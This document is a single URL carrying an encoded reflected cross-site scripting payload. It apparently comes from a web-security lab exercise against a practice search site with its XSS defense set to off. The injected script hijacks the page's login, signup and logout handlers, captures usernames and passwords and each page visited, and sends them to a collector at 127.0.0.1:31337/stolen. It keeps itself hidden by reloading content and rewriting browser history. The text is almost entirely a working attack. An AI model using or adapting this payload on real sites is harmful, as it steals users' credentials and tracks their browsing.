http://permalink.co/search?xssdefense=0&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20function%20log(data)%20%7B%0A%20%20%20%20console.log(%24.param(data))%0A%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%7D%0A%0A%20%20function%20addListeners()%7B%0A%20%20%20%20%24(%2F%23search-btn%2F.source).click(function(event)%7B%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20proxy(%2Fsearch%3Fq%3D%2F.source%2B%24(%2F%23query%2F.source).val())%0A%20%20%20%20%7D)%3B%0A%20%20%20%20%24(%2F%23bungle-lnk%2C%23search-again-btn%2F.source).click(function(event)%7B%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20proxy(String.fromCharCode(46%2C47))%3B%0A%20%20%20%20%7D)%3B%0A%20%20%20%20%24(%2F%23log-in-btn%2F.source).off(%2Fclick%2F.source).on(%2Fclick%2F.source%2Cfunction(event)%7B%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20log(%7Bevent%3A%20%2Flogin%2F.source%2C%20user%3A%20%24(%2F%23username%2F.source).val()%2C%20pass%3A%24(%2F%23userpass%2F.source).val()%7D)%3B%0A%20%20%20%20%20%20%24(%2Fhtml%2F.source).load(%2Flogin%2F.source%2C%7Busername%3A%24(%2F%23username%2F.source).val()%2C%20password%3A%20%24(%2F%23userpass%2F.source).val()%7D%2C%20function(response%2C%20status%2C%20xhr)%7B%0A%20%20%20%20%20%20%20%20addListeners()%3B%0A%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D)%3B%0A%20%20%20%20%24(%2F%23new-account-btn%2F.source).off(%2Fclick%2F.source).on(%2Fclick%2F.source%2Cfunction(event)%7B%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%24(%2Fhtml%2F.source).load(%2Fcreate%2F.source%2C%7Busername%3A%24(%2F%23username%2F.source).val()%2C%20password%3A%20%24(%2F%23userpass%2F.source).val()%7D%2C%20function(response%2C%20status%2C%20xhr)%7B%0A%20%20%20%20%20%20%20%20addListeners()%3B%0A%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%24(%2F%23log-out-btn%2F.source).click(function(event)%7B%0A%20%20%20%20%20%20log(%7Bevent%3A%20%2Flogout%2F.source%2C%20user%3A%20%24(%2F%23logged-in-user%2F.source).text()%7D)%3B%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%24(%2Fhtml%2F.source).load(%2Flogout%2F.source%2C%7B%7D%2C%20addListeners)%3B%0A%20%20%20%20%7D)%3B%0A%20%20%7D%0A%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%24(%2Fhtml%2F.source).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%24(%2Fhtml%2F.source).show()%3B%0A%0A%20%20%20%20%20%20log(%7Bevent%3A%20%2Fnav%2F.source%2C%20uri%3A%20href%7D)%3B%0A%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20href)%3B%0A%20%20%20%20%20%20addListeners()%3B%0A%0A%20%20%20%20%7D)%3B%0A%0A%20%20%7D%0A%20%20window.onpopstate%3Dfunction(event)%7B%0A%20%20%20%20%24(%2Fhtml%2F.source).load(document.location.pathname%2C%20function()%7B%0A%20%20%20%20%20%20%24(%2Fhtml%2F.source).show()%3B%0A%20%20%20%20%20%20log(%7Bevent%3A%20%2Fnav%2F.source%2C%20uri%3A%20document.location.pathname%7D)%3B%0A%20%20%20%20%20%20addListeners()%3B%0A%20%20%20%20%7D)%3B%0A%20%20%7D%3B%0A%20%20%24(%2Fhtml%2F.source).hide()%3B%0A%20%20%24(%2Fhtml%2F.source).load(%2F.%2F.source%2C%20function()%7B%0A%20%20%20%20%24(%2Fhtml%2F.source).show()%3B%0A%0A%20%20%20%20log(%7Bevent%3A%20%2Fnav%2F.source%2C%20uri%3A%20String.fromCharCode(46%2C47)%7D)%3B%0A%20%20%20%20history.replaceState(null%2C%20null%2C%20%2F.%2F.source)%3B%0A%20%20%20%20addListeners()%3B%0A%0A%20%20%7D)%3B%0A%0A%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscript%3E
